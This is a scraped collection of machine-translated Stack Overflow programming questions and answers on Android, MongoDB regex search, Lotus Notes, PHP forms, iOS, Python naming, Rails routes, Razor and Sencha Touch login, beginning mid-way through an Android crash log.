08-30 15:05:10.711: E/AndroidRuntime(739):  at dalvik.system.NativeStart.main(Native Method)
08-30 15:05:10.711: E/AndroidRuntime(739): Caused by: java.lang.NullPointerException
08-30 15:05:10.711: E/AndroidRuntime(739):  at main.page.BuddyDBAdapter.getAllNames(BuddyDBAdapter.java:35)
08-30 15:05:10.711: E/AndroidRuntime(739):  at main.page.TestSpinnerDB.onCreate(TestSpinnerDB.java:32)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.Activity.performCreate(Activity.java:4465)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
08-30 15:05:10.711: E/AndroidRuntime(739):  ... 11 more
08-30 15:05:10.881: I/dalvikvm(739): threadid=3: reacting to signal 3
08-30 15:05:10.891: I/dalvikvm(739): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:05:11.301: I/dalvikvm(739): threadid=3: reacting to signal 3
08-30 15:05:11.311: I/dalvikvm(739): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:10:10.791: I/Process(739): Sending signal. PID: 739 SIG: 9
08-30 15:34:24.541: I/dalvikvm(1844): threadid=3: reacting to signal 3
08-30 15:34:24.581: I/dalvikvm(1844): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:34:24.861: D/gralloc_goldfish(1844): Emulator without GPU emulation detected.
08-30 15:34:28.141: D/AndroidRuntime(1844): Shutting down VM
08-30 15:34:28.141: W/dalvikvm(1844): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
08-30 15:34:28.161: E/AndroidRuntime(1844): FATAL EXCEPTION: main
08-30 15:34:28.161: E/AndroidRuntime(1844): java.lang.RuntimeException: Unable to start activity ComponentInfo{main.page/main.page.TestSpinnerDB}: java.lang.NullPointerException
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread.access$600(ActivityThread.java:123)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.os.Looper.loop(Looper.java:137)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread.main(ActivityThread.java:4424)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at java.lang.reflect.Method.invokeNative(Native Method)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at java.lang.reflect.Method.invoke(Method.java:511)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at dalvik.system.NativeStart.main(Native Method)
08-30 15:34:28.161: E/AndroidRuntime(1844): Caused by: java.lang.NullPointerException
08-30 15:34:28.161: E/AndroidRuntime(1844):     at main.page.BuddyDBAdapter.getAllNames(BuddyDBAdapter.java:35)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at main.page.TestSpinnerDB.onCreate(TestSpinnerDB.java:32)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.Activity.performCreate(Activity.java:4465)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
08-30 15:34:28.161: E/AndroidRuntime(1844):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
08-30 15:34:28.161: E/AndroidRuntime(1844):     ... 11 more
08-30 15:34:28.491: I/dalvikvm(1844): threadid=3: reacting to signal 3
08-30 15:34:28.511: I/dalvikvm(1844): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:34:28.722: I/dalvikvm(1844): threadid=3: reacting to signal 3
08-30 15:34:28.731: I/dalvikvm(1844): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:34:30.381: I/Process(1844): Sending signal. PID: 1844 SIG: 9 
```

哦，顺便说一句，我已经设法在`spinner`几周前将数据显示到其中，但是最近在我在一个数据库文件中创建表之后，我无法将数据显示到`spinner`.

我遵循了这个示例[Android：从 SQLite 数据库填充 Spinner，](http://www.samcoles.co.uk/mobile/android-populate-a-spinner-from-your-sqlite-database/)这使我能够显示数据。
我再次按照该示例进行操作，并且已收到`NullPointerException`并强制关闭。
任何帮助将不胜感激。谢谢
**更新**
我已经发布了 BuddyDBAdapter.java 的完整代码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T07:47:09.857

唯一可能的事情是，

您的`db`对象在**BuddyDBAdapter 类**的 方法中为**null** ...`getAllNames()`

 ****尝试：**

```
public Cursor getAllNames()
{
  if(db != null)
  return db.query(CREATE_TABLE_BUDDIESLIST, new String[] { KEY_ROWID, KEY_NAME }, null, null, null, null, null);
  return null;
} 
```

**编辑：**

也叫

```
BuddyDBAdapter friendDB = new BuddyDBAdapter(this); 
```

在**TestSpinnerDB**`onCreate()`活动中..

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:49:15.367

你在哪里声明`friendDB`了`onCreate`这就是那个`NullpointerException`来的原因。尝试声明所需的`BuddyDBAdapter.class.`Ex，

```
Spinner testSpinner = (Spinner) findViewById(R.id.nameSpinner);
BuddyDBAdapter friendDB = new BuddyDBAdapter(); // Declare something like this
Cursor testCursor = friendDB.getAllNames();
startManagingCursor(testCursor); 
```

我认为您刚刚创建`friendDB`为全局变量。而且，没有在任何地方声明。发布完整代码。****

# node.js - 如何使用 MongoDB node.js 驱动程序执行包含查询？

> ID：12192197
> 
> 赞同：5
> 
> 时间：2012-08-30T07:45:52.657
> 
> 标签：node.js, mongodb

我正在尝试对包含某个子字符串的项目进行搜索，但我没有得到任何结果（即使我知道数据适合查询，包括大小写）：

```
collection.find({name: "/.*" + keyword + ".*/"}).toArray(function(err, items) 
```

这不应该与包含关键字的所有内容相匹配吗？它只是返回一个空对象。

我只是在 ExpressJS 应用程序中使用常规的 MongoDB 驱动程序。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T08:31:04.537

您需要首先构建一个正则表达式应该尝试这样的事情：

```
var regex = RegExp("/.*" + keyword + ".*/") 
```

然后将变量传递给查询。我通常发现将查询作为变量进行并将其传递给它更容易：

```
var query = { FieldToSearch: new RegExp('^' + keyword) };
collection.find(query).toArray(...) 
```

我已将正则表达式作为左根正则表达式包含在内，以利用索引（如果可能，总是推荐用于性能）。更多请看这里：

[http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-RegularExpressions](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-RegularExpressions)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-12-22T21:17:59.343

我是这样做的

```
 keyword = "text_to_search";
    collection.find({name: {$Regex: keyword, $options:$i }}) 
```

我使用 i $i 使查询不区分大小写，但您也可以使用其他选项

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-07T19:14:09.330

试试这个：

```
var keyword = req.params.keywords;
var regex = RegExp(".*" + keyword + ".*");
Note.find({noteBody: regex, userID: userID}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-02-14T18:00:34.463

我从请求参数中得到了关键字，我想用这些关键字从noteBody中搜索，现在关键字是一个变量。如果要在数据库中查找变量，格式必须为 var regex = RegExp("." + keyword + ".")。希望这可以帮助。谢谢

# listbox - 从列表框中删除文件的简单方法 - LOTUS 7

> ID：12192198
> 
> 赞同：0
> 
> 时间：2012-08-30T07:45:57.307
> 
> 标签：listbox, lotus-notes, attachment, items

所以我有一个按钮来显示我创建的列表框。这个列表框有一些附件，它填充了一些项目（附件）。此外，我创建了另一个按钮，我想删除我将从列表框中选择的项目。有没有简单的方法/公式可以做到这一点？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T14:27:50.380

请尝试更清楚地解释您要做什么。我假设“列表框”是指列表框类型的字段。这种字段不能包含附件，只能包含文本值。您的意思是列表框包含一个或多个附件的名称吗？

您谈论“显示列表框的按钮”。这与问题有关吗？

列表框是如何创建和填充的？我假设另一个字段包含附件的名称？

我使用了一些假设（您确实需要更详细地解释您的问题），这就是我解决它的方法：

* * *

字段“ListData”：文本字段，隐藏。包含您要显示的值（例如附件名称），以分号分隔。

字段'ListBox'：列表框字段，允许多个值，文档刷新时刷新选择，使用公式进行选择：@Explode(ListData;";")

按钮“删除所选”：

```
Sub Click(Source As Button)
    Dim ws As New NotesUIWorkspace
    Dim uidoc As NotesUIDocument
    Dim selected As Variant
    Dim listdata As Variant
    Dim files List As String
    Dim newlistdata As String
    Dim i As Integer

    Set uidoc = ws.CurrentDocument
    '*** Read the field values and split into arrays
    listdata = Split( uidoc.FieldGetText("ListData"), ";" )
    selected = Split( uidoc.FieldGetText("ListBox"), ";" )
    '*** Convert listdata array into a Lotusscript list
    Forall file In listdata
        files(file) = file
    End Forall
    '*** Loop through the array of selected values
    For i = 0 To Ubound(selected)
        '*** Check if the currently processed value is in the files list
        If Iselement(files(selected(i))) Then
            Erase files(selected(i))    ' Remove/erase from the list
            '*** Add code here to remove attachments from document
            '*** if that is what you actually want to do.
            '*** Use notesEmbeddedObject.Remove method for that.
        End If  
    Next
    '*** Now we have the files list with the selected items removed.
    '*** Loop though the list and build a string of remaining values
    Forall ff In files
        newlistdata = newlistdata + ff + ";"    
    End Forall
    '*** Write the new string of remaining attachments back to the listdata field
    Call uidoc.FieldSetText("ListData", newlistdata)
    Call uidoc.Refresh
End Sub 
```

您只需要考虑问题并弄清楚您真正想要做什么，然后将其分解为更小的步骤，解决每个步骤，等等。Lotusscript 与其他语言没有什么不同，

注意：代码可能看起来很复杂并且比它必须的要长，因为我添加了大量的评论，所以你（希望）可以理解正在做什么......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T09:38:52.900

1) 对列表框中的选项使用隐藏的多值字段。它的值将根据默认值（@Attachment 或另一个字段值）计算，并将删除另一个隐藏字段“已删除”（@Replace）中提到的所有值。

2）“已删除”字段将由您的“删除”按钮填充，例如

```
FIELD removed := @Trim(@Unique(removed:listbox));@All 
```

“listbox”包含当前在列表框中选择的值。

3) 我建议提供一些关于已删除值和撤消/重置能力的反馈。

# ios - 检查网络/连接是否在 iOS 中使用

> ID：12192203
> 
> 赞同：3
> 
> 时间：2012-08-30T07:46:30.857
> 
> 标签：ios, nsurlconnection

我想知道是否有可能检查应用程序现在是否正在使用网络连接来做某事。

该应用程序具有正在上传数据的后台服务，用户也可以按下按钮下载数据。我不希望这个用户能够下载，直到后台进程完成。

框架是否提供了一些东西来检查连接是否被使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T07:55:44.073

我建议`BOOL`在后台上传代码所在的方法中使用属性。

然后在按钮的 sender 方法中，执行以下操作：

```
if (!upLoading) 
{
  // Your Downloading codes
}
else
{
  // Show an alert here 
} 
```

# php - 我无法使用 3 页以上的表单传输 html 数据

> ID：12192205
> 
> 赞同：-1
> 
> 时间：2012-08-30T07:46:34.057
> 
> 标签：php, html, forms, nicedit

![在此处输入图像描述](../Images/d84852b60fe1b5851e8a05a343b3c8c2.png)![在此处输入图像描述](../Images/5e349cdc8f7c79f2b7900419dd947272.png)![在此处输入图像描述](../Images/f764ab5906dfd743e1e35593d32b9502.png)我有 3 页。

1.  a1.php : 添加记录
2.  a2.php : 做某事
3.  a3.php : 记录他们的数据库

但是出现了问题，将“html 数据”从 a2.php 传输到 a3.php。

示例：我尝试记录到 a1.php 的记录是：

```
<form name="form1" type="post" action="sayfa_1.php">
<input type='submit' value=' gidiyoruz' >
<input type='submit' value=' gidiyoruz' >
</form> 
```

a1.php --> a2.php --> a3\. php

在 a2.php 上，我没有问题。但是之后。在 a3.php 上，当我显示即将到来的数据时，我看到两个按钮，上面没有 HTML 代码。

页如下。

谢谢。

## a1.php

```
<script type="text/javascript" src="http://js.nicedit.com/nicEdit-latest.js"></script> <script type="text/javascript">
//<![CDATA[
bkLib.onDomLoaded(function() { nicEditors.allTextAreas() });
//]]>
</script>

<form name="form1" type="post" action="a2.php">  

<textarea rows="20" cols="90" id="anlam"  name="anlam"     style="overflow:auto;" >    </textarea>  

<input type="submit" /> 
</form> 
```

## a2.php

```
<?php
$anlam=$_GET["anlam"];
echo $anlam;
?>

<?php echo "<form name='fm' id='fm' action='a3.php' method='get'>";  ?>

<textarea rows="2" cols="50" name="anlam" style="visibility:hidden;"  /> <?php echo $anlam; ?> </textarea>

<input type="submit" /> 
</form> 
```

## a3.php

```
<?php
$anlam=$_GET["anlam"];

echo nl2br($anlam); 
```

步伐图像在上面。错误：a3.php（代替代码，有两个按钮）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:12:46.337

所以您希望页面在您单击提交按钮时将您的数据从一个发送到另一个！使用带有 isset 的 if 条件。

```
 if(isset($_POST['name_of_submit_button']))
 {
   // your code of next page
 } 
```

n 同样，通过为您的提交按钮提供另一个名称并应用相同的条件来继续另一个页面！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:57:14.710

尝试使用

```
method="post" 
```

为您的表格。你也可以只使用

```
<input type="hidden" name="anlam" value="<?php echo $anlam; ?>"/> 
```

将您的可变内容传输到最后一页。您确定隐藏的文本区域/输入包含正确的值吗？检查浏览器中的源代码以了解此步骤。

# iphone - 我们可以创建文本图像吗

> ID：12192206
> 
> 赞同：0
> 
> 时间：2012-08-30T07:46:45.993
> 
> 标签：iphone, xcode

我想创建文本的 UIImage。是否有任何可以帮助我的教程。我阅读了很多博客，但所有博客都显示了如何在 uiimage 上创建文本，但我需要书面文本的 uimage。如果有人对此有任何想法，请帮助我。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T07:55:28.720

嗨，你试试这个……我希望它对你有用

```
-(UIImage *)imageFromText:(NSString *)text withImage:(UIImage*)img{
   // set the font type and size
   UIFont *font = [UIFont systemFontOfSize:100.0];  
   CGSize size  = [text sizeWithFont:font];

   // check if UIGraphicsBeginImageContextWithOptions is available (iOS is 4.0+)
   if (UIGraphicsBeginImageContextWithOptions != NULL)
       UIGraphicsBeginImageContextWithOptions(size,NO,0.0);
   else
       // iOS is < 4.0 
       UIGraphicsBeginImageContext(size);

   // optional: add a shadow, to avoid clipping the shadow you should make the context size bigger 
   //
   CGContextRef ctx = UIGraphicsGetCurrentContext();
   CGContextSetShadowWithColor(ctx, CGSizeMake(0.0, 1.0), 5.0, [[UIColor blackColor] CGColor]);
   CGContextSetBlendMode(ctx,kCGBlendModeNormal);
//   CGContextSetFillColorWithColor(ctx, [UIColor whiteColor].CGColor);

    CGContextSetFillColorWithColor(ctx, [UIColor colorWithPatternImage:img].CGColor);

   /*NSLog(@"Rect  %@",CGContextGetClipBoundingBox(ctx));
    CGImageRef alphaMask = CGBitmapContextCreateImage(ctx);
    CGContextClipToMask(ctx, CGContextGetClipBoundingBox(ctx), alphaMask);*/

   // draw in context, you can use also drawInRect:withFont:
   [text drawAtPoint:CGPointMake(0.0, 0.0) withFont:font];

   // transfer image
   UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
   UIGraphicsEndImageContext();    

   return image;
} 
```

方法调用将是...

```
[self imageFromText:@"Booooooooom"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:54:12.810

检查这段代码，应该可以工作。您可以在函数内自由更改某些参数。请注意，您必须将在其他地方创建的 UIImage 传递给此方法。

```
//Add text to UIImage
-(UIImage *)addText:(UIImage *)img text:(NSString *)text1{
    int w = img.size.width;
    int h = img.size.height; 
    //lon = h - lon;
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGContextRef context = CGBitmapContextCreate(NULL, w, h, 8, 4 * w, colorSpace, kCGImageAlphaPremultipliedFirst);

    CGContextDrawImage(context, CGRectMake(0, 0, w, h), img.CGImage);
    CGContextSetRGBFillColor(context, 0.0, 0.0, 1.0, 1);

    char* text  = (char *)[text1 cStringUsingEncoding:NSASCIIStringEncoding];// "05/05/09";
    CGContextSelectFont(context, "Arial", 18, kCGEncodingMacRoman);
    CGContextSetTextDrawingMode(context, kCGTextFill);
    CGContextSetRGBFillColor(context, 255, 255, 255, 1);

    //rotate text
    CGContextSetTextMatrix(context, CGAffineTransformMakeRotation( -M_PI/4 ));

    CGContextShowTextAtPoint(context, 4, 52, text, strlen(text));

    CGImageRef imageMasked = CGBitmapContextCreateImage(context);
    CGContextRelease(context);
    CGColorSpaceRelease(colorSpace);

    return [UIImage imageWithCGImage:imageMasked];
} 
```

# python - python文件名的下划线前缀是什么？

> ID：12192207
> 
> 赞同：28
> 
> 时间：2012-08-30T07:46:51.200
> 
> 标签：python, naming-conventions, prefix

例如`cherryPy`，有如下文件：

*   `__init__.py`
*   `_cptools.py`

它们有何不同？这是什么意思？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-08-30T07:51:35.733

`__...__`表示保留的 Python*名称*（在文件名和其他名称中）。您不应该使用双下划线符号来*发明*自己的名字；如果您使用现有的，它们具有特殊的功能。

在此特定示例中，`__init__.py`定义了包的“主要”单元；它还导致 Python 将特定目录视为一个包。它是您调用时将使用的单位`import cherryPy`（并且`cherryPy`是一个目录）。[模块教程](http://docs.python.org/tutorial/modules.html#packages)中对此进行了简要说明。

另一个例子是`__eq__`为类提供相等比较的方法。您可以直接调用这些方法（`==`例如，当您使用运算符时，您可以隐式使用它们）；但是，较新的 Python 版本可能会定义更多这样的方法，因此您不应该发明自己的`__`-names，因为它们可能会发生冲突。[您可以在数据模型](http://docs.python.org/reference/datamodel.html#basic-customization)文档中找到此类方法的详细列表。

`_...`通常用作“内部”名称。例如，`_`不应该直接使用以 开头的模块；同样，带有`_`的方法应该是私有的，依此类推。这只是一个约定，但你应该尊重它。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-30T07:54:01.957

[Python 代码的样式指南 - 描述性：命名样式](http://www.python.org/dev/peps/pep-0008/#descriptive-naming-styles)中详细描述了这些和其他命名约定

简要地：

*   `__double_leading_and_trailing_underscore__`: 存在于用户控制的命名空间中的“神奇”对象或属性。例如`__init__`，`__import__`或`__file__`。永远不要发明这样的名字；仅按记录使用它们。
*   `_single_leading_underscore`：弱“内部使用”指标。例如`from M import *`，不导入名称以下划线开头的对象。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-30T07:53:29.737

`__init__.py`是一个特殊文件，当它存在于文件夹中时，该文件夹会变成模块。导入模块后，`__init__.py`执行。另一个只是一个命名约定，但我猜这会说您不应该直接导入该文件。

看看这里：[6.4。](http://docs.python.org/tutorial/modules.html#packages)用于解释如何创建模块的[包。](http://docs.python.org/tutorial/modules.html#packages)

一般规则：如果 Python 中有任何东西是命名的，`__anything__`那么它就是特别的东西，你应该在使用它之前阅读它（例如魔术函数）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-05-15T00:04:12.783

当前选择的答案已经很好地解释了`__init__.py`.

*而且我相信文件名*中没有真正需要`_cptools.py`符号。[应用Python 代码样式指南中](http://www.python.org/dev/peps/pep-0008/#descriptive-naming-styles)的“单前导下划线”规则可能是不必要的扩展用法- 描述性：命名样式：

 *> *   `_single_leading_underscore`：弱“内部使用”指标。例如`from M import *`，不导入名称以下划线开头的对象。

如果有的话，上述样式指南实际上是**反对**在文件名中使用`_single_leading_underscore.py`的。它的[包和模块名称部分](https://www.python.org/dev/peps/pep-0008/#package-and-module-names)仅在使用 C/C++ 实现模块时提及此类用法。

通常，该`_single_leading_underscore`符号通常在函数名称、方法名称和成员变量中观察到，以将它们与其他常规方法区分开来。

几乎不需要（如果有的话）`_single_leading_underscore.py`在文件名上使用，因为开发人员不是**刮板**，他们不太可能根据文件名来挽救文件。它们只会遵循包的最高级别的 API（从技术上讲，它的暴露实体由 定义`__all__`），因此所有文件名甚至都不明显，更不用说成为是否使用文件（即模块）的一个因素。*

# ios - 哪种 ios 字体同时支持文本和表情符号？

> ID：12192210
> 
> 赞同：0
> 
> 时间：2012-08-30T07:47:10.940
> 
> 标签：ios, emoji

这是我第一次为我的应用程序处理表情符号键盘。我正在使用自定义字体来显示文本和表情符号字符。我想知道支持在我的应用程序中显示的文本和表情符号字符的 ios 字体。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:24:46.470

您不需要使用特殊字体来支持表情符号。只需使用您用来显示“普通”字符的任何字体，iOS 将自动切换到该`AppleColorEmoji`字体以显示任何“表情符号”字符。

如果您想了解更多关于使用什么字体的信息， http: [//iosfonts.com/](http://iosfonts.com/)是一个很棒的网站。

# ruby-on-rails - rails 3中嵌套模型的CRUD操作

> ID：12192213
> 
> 赞同：0
> 
> 时间：2012-08-30T07:47:25.440
> 
> 标签：ruby-on-rails

我是 rails 3 的新手，按照 ruby​​ 站点中的指南，我构建了第一个博客应用程序。

但是在应用程序中，模型“评论”没有编辑/更新/删除操作。

然后我尝试添加它，但我失败了。

我不只是为模型“评论”生成模型，而是使用以下方法为模型“评论”创建脚手架：

```
rails generate scaffold Comment commenter:string body:text post:references 
```

在 post.show 页面中，我将其修改如下：

```
<% @post.comments.each do |comment| %>
  <tr>
    <td><%= comment.commenter %></td>
    <td><%= comment.body %></td>
    <td><%= link_to 'Edit', edit_comment_path(comment) %></td>
    <td><%= link_to 'Destroy', comment, confirm: 'Are you sure?', method: :delete %></td>
  </tr>
<% end %> 
```

它们已列出，但是当我单击“编辑”或“删除”链接时，它会尝试跳转到：

```
http://localhost:3000/comments/1 
```

然后我会得到错误：

```
No route matches [GET] "/comments/3/edit" or

No route matches [DELETE] "/comments/3" 
```

我现在不知道。

我可以学习任何开箱即用的演示吗？

* * *

更新：

在 routes.rb 中：

```
resources :posts do
  resources :comments
end 
```

注：以下内容由本人手动填写。

rails 生成的配置是：

```
resources :posts
resources :comments 
```

为什么我修改它是在评论构建表单中，post url应该是“/posts/1/comments”来创建新的评论，否则post url将是“/comments”，它不会关联帖子和评论。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:20:42.187

你配置你的`routes`？你`config/routes.rb`应该包含

```
resources :comments 
```

您还可以运行`rake routes`以查看基于您的资源配置的应用程序的可用 url。

**编辑：**

对于*演示，您可以*[在 youtube 上](http://www.youtube.com/watch?v=fgCM-CR0EXs&feature=player_detailpage#t=301s)尝试此视频。但是，您可以在网络上找到很多关于此的视频。

**编辑：**

因此，您似乎需要两种方式的评论资源。既可以作为帖子的嵌套资源，也可以作为顶级资源。所以你可以把两件事放在一起

```
resources :posts do
   resources :comments
end
resources :comments 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T09:07:41.557

由于您已经嵌套了资源，因此您应该使用：

```
edit_post_comment_path(@post, comment) 
```

更清楚：

```
<td><%= link_to 'Edit', edit_post_comment_path(@post, comment) %></td>
<td><%= link_to 'Destroy', post_comment_path(@post, comment), confirm: 'Are you sure?', method: :delete %></td> 
```

# asp.net-mvc-3 - HTML5，剃刀。如何为标题元素获得不同的样式？

> ID：12192216
> 
> 赞同：1
> 
> 时间：2012-08-30T07:47:33.467
> 
> 标签：asp.net-mvc-3, html, razor

我是 HTML5 的新手。此代码在 if 语句上返回解析器错误。我不知道它是否会起作用，那么如何修复 if 语句以及如何使它起作用？

```
<div class="page">
    @if (Constants.EnvironmentSetting.ToUpper() == "LIVE"){
        <header>
    } else {
        <header class="headerTest">
    }

        <div id="title">
            @Content.Image("MulalleyLogoSmall.jpg", "float:left;padding:10px 10px 0 10px", Url)
            <div class="head" style="float:left;padding-top:4px;">Instruction To Open Contract (ITOC)</div>
        </div>

        <div id="logindisplay">
            @Html.Partial("_LogOnUserControl")
        </div> 

        <nav>
            @Html.Partial("_MenuItems")
        </nav>
    </header>

    <section>
        @RenderBody()
    </section>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:57:59.720

您不需要将花括号放在自己的行上。

如果你把它改成这个会发生什么？

```
@if (Constants.EnvironmentSetting.ToUpper() == "LIVE"){
    @:<header>
} else {
    @:<header class="headerTest">
} 
```

告诉 Razor 解析器该`@:`行的其余部分应作为标记而不是 C# 代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:49:40.023

您必须将 { 放在 Razor 中自己的行上

```
@if (Constants.EnvironmentSetting.ToUpper() == "LIVE"){ 
```

应该

```
@if (Constants.EnvironmentSetting.ToUpper() == "LIVE")
{ 
```

否则，该部分代码应该可以工作。

附带说明，最好使用

```
Constants.EnvironmentSettings.Equals("LIVE", 
             StringComparison.CurrentCultureIgnoreCase); 
```

> ToUpper 方法通常用于将字符串转换为大写，以便在不区分大小写的比较中使用它。执行不区分大小写比较的更好方法是调用具有 StringComparison 参数的字符串比较方法，该参数的值设置为 StringComparison.CurrentCultureIgnoreCase 以进行区分区域性、不区分大小写的比较。

[http://msdn.microsoft.com/en-us/library/ewdd6aed.aspx](http://msdn.microsoft.com/en-us/library/ewdd6aed.aspx)

# sencha-touch - sencha-touch: 登录请求-响应

> ID：12192224
> 
> 赞同：1
> 
> 时间：2012-08-30T07:48:11.577
> 
> 标签：sencha-touch, extjs, sencha-touch-2

我对**sencha-touch**很陌生，并开始构建简单的**登录**表单。我的 UI 已准备就绪，但现在我被困在如何为登录请求响应编写代码上。

同样重要的是，我如何指向特定的 url 来发出 POST/GET 请求？

还有如何获取&解析json数据。？

我阅读了 sench-touch 文档，但我不明白如何使用该模型、存储、代理。关于如何创建模型、存储、代理以进行简单登录的建议非常有帮助。

提前致谢。

***编辑插入图像：***

![在此处输入图像描述](../Images/e951b9634d3365bb75b2b1f44481485c.png)

```
var loginForm = Ext.create('Ext.form.Panel', {
    fullscreen: true,

    items: [{
        xtype: 'fieldset',
        items: [
            {
                xtype: 'textfield',
                name : 'name',
                label: 'Username'
            },
            {
                xtype: 'passwordfield',
                name : 'password',
                label: 'Password'
            }
        ]
    }]
});

loginForm.add({
                xtype: 'button',
                text: 'Login',
                ui: 'confirm',
                badgeText: '1',
                // handler: function(){
                    // // alert("handler invoked");
                // },

                listeners : {
                tap : function() {

                var form = Ext.getCmp('form-id');
                var values = form.getValues();
                Ext.Ajax.request({
                      url: 'https://102.XXX.X.XX:XXXX/QuizMasterServer/rest/login',
                      params: values,

                      success: function(response){
                          var text = response.responseText;
                          Ext.Msg.alert('Success', text);
                     },

                     failure : function(response) {
                           Ext.Msg.alert('Error','Error while submitting the form');
                           console.log(response.responseText);
                     }
              });
}
}
});

loginForm.add({
    xtype: 'toolbar',

    // id:'loginPressed',

    docked: 'bottom',
    // layout: { pack: 'center' },
    items: [
        {
            xtype: 'button',
            text: 'Login',
            ui: 'confirm',
            // action: 'login',

            handler: function() {
                loginForm.setValues({
                    name: 'vs',
                    password: 'vs'
                })
            }
        },
        {
            xtype: 'button',
            text: 'Clear',
            ui:'decline',
            handler: function() {
                loginForm.reset();
            }
        },

        {
            xtype: 'button',
            centered: true,
            text: 'Sign Up',
            handler: function() {
                alert('New User?');
            }
        },
        {
            xtype: 'container',
            html: 'New User? ',
            style: {
                color: 'yellow',
            }
        },
    ]
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-10T12:14:11.237

示例 usando ajax 请求：

使用 ajax 请求的示例：

```
Ext.Ajax.request({
        url: domain.com/auth/signIn/',
        method: 'post',
        scope: this,
        params: {
            email: username,
            password: password
        },

        success: function (response) {

            var result = Ext.JSON.decode(response.responseText);

            if (result.meta.code==200)
            {

                /**
                 * Salvando dados do usuário em localStorage
                 * Save user data on localStorage
                 */
                window.localStorage.setItem('myID', result.response.id);
                window.localStorage.setItem('email', result.response.email);
                window.localStorage.setItem('token', result.response.token);
                window.localStorage.setItem('fName', result.response.fName);
                window.localStorage.setItem('lName', result.response.lName);
                window.localStorage.setItem('photo', result.response.photo);
                window.localStorage.setItem('gender', result.response.gender);
                window.localStorage.setItem('relationship', result.response.relationship);
                window.localStorage.setItem('interest', result.response.interest);

                this.signInSuccess();                    
                this.verifyDeviceToken(result.response.id, 'signin');

            }
            else
            {

                 this.signInFailure('Error', 'The data reported are invalid');

            }
        },

        failure: function (response) {

        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T10:33:56.867

你快到了！

将您的代码添加到成功回调中。注意，如果 ajax 返回 ok 则触发 success() 回调，否则为 failure()。回调 callback() 在这两种情况下都会触发。

```
Ext.Ajax.request({
    url: 'https://102.XXX.X.XX:XXXX/QuizMasterServer/rest/login',
    params: values,

    success: function(response){
        var text = response.responseText;
        // for example
        var result = Ext.decode(text);  // json parsing
        if (result.ok) {
            //create new widget
            var homeView = Ext.widget('homePage', {...});
            Ext.Viewport.remove(formLogin);
            Ext.Viewport.add(homeView);
            ///... etc
            homeView.show()
        }
        Ext.Msg.alert('Success', text);
    },

    failure : function(response) {
        Ext.Msg.alert('Error','Error while submitting the form');
        console.log(response.responseText);
    }
}); 
```

免责声明。当然，代码没有经过测试......

干杯，奥列格

# .net - 属性的 ASP.NET MVC 编辑器模板

> ID：12192225
> 
> 赞同：12
> 
> 时间：2012-08-30T07:48:11.593
> 
> 标签：.net, asp.net-mvc, mvc-editor-templates

